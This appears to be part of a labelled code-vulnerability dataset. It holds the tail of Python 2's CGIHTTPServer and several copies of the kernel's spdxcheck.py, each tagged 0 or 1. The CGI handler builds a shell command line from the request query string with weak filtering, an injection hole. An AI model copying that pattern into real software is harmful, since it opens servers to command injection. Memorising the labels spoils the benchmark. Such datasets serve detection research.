    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
28,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""deprecated"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",0
29,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"/scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",1
30,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""deprecated"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
